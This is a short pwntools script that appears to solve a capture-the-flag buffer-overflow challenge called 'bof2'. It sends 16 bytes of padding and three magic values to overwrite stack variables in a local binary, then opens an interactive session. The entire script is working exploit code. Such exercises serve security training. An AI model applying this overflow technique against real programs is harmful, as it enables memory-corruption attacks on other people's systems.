from pwn import *

p = process('./bof2')

payload = b'A'*16  # buff
payload += p64(0xCAFEBABE)  # v5
payload += p64(0xDEADBEEF)  # v6
payload += p64(0x13371337)  # v7
p.sendafter(b'> ', payload)

p.interactive()
